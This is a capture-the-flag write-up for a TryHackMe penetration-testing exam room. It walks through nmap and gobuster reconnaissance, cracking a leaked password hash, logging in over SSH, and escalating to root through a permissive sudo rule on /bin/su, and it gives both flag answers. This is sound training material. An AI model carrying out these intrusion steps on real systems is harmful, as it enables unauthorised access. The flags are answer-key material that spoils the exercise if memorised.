# TryHackMe [CC: Pen Testing](https://tryhackme.com/room/ccpentesting) Final Exam
### References
* Lyon, G. (2021). `nmap` Reference Guide. nmap.org. https://nmap.org/book/man.html
* Miller, T. C. (2021). `sudo` Manual. sudo.ws. https://www.sudo.ws/man/1.9.6/sudo.man.html
* Reeves, OJ. (2021). `OJ/gobuster/README.md`. GitHub. https://github.com/OJ/gobuster/blob/master/README.md
## reconnaissance
### `nmap`
* Network scan results:
  * The server runs some version of Ubuntu
  * SSH is listening on TCP port 22.
  * Apache web server is listening on port 80.
```bash
$ nmap -sV -sC <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 22:37 AEST
Nmap scan report for <MACHINE_IP>
Host is up (0.28s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
|_  256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.63 seconds
```
### `gobuster`
1. Initial folder enumeration:
```bash
$ gobuster dir -u http://<MACHINE_IP> -w $(pwd)/directory-list-2.3-medium.txt
/secret               (Status: 301) [Size: 313] [--> http://<MACHINE_IP>/secret/]
```
1. Enumeration for common web server file extensions:
```bash
$ gobuster dir -u http://<MACHINE_IP>/secret -w $(pwd)/directory-list-2.3-medium.txt -x .html,.php,.txt
/index.html           (Status: 200) [Size: 0]
/secret.txt           (Status: 200) [Size: 46]
```

   * `http://<MACHINE_IP>/secret/secret.txt`:
```
nyan:046385855FC9580393853D8E81F240B66FE9A7B8
```
2. By using [CrackStation](https://crackstation.net/) on the `secret.txt` hash, it is mapped to `nyan`.
   * It is safe to assume the `username:hash` format is similar to the format used in Linux's `/etc/passwd` file, and thus ir related to the user authentication on that server.
## What is the `user.txt`
1. An SSH session was established by using the credentials (username and password of `nyan`) found in the `secret.txt` file.
2. By using the interactive shell provided by the SSH session, the content of `user.txt` was extracted.
```bash
$ ssh nyan@<MACHINE_IP>
nyan@ubuntu:~$ cat user.txt 
supernootnoot
```

**Answer**: `supernootnoot`
## What is the `root.txt`
1. The `-l` flag of `sudo` was used to list binaries `sudo` is authorized to use on this server.
2. The `/bin/su` binary was used to get `root` access.
3. The content of `/root/root.txt` was read through the established root shell.
```bash
nyan@ubuntu:~$ sudo -l
Matching Defaults entries for nyan on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su
nyan@ubuntu:~$ sudo /bin/su
[sudo] password for nyan: 
Sorry, user nyan is not allowed to execute '/bin/sh' as root on ubuntu.
nyan@ubuntu:~$ sudo /bin/su
root@ubuntu:/home/nyan# cat /root/root.txt
congratulations!!!!
```

**Answer**: `congratulations!!!!`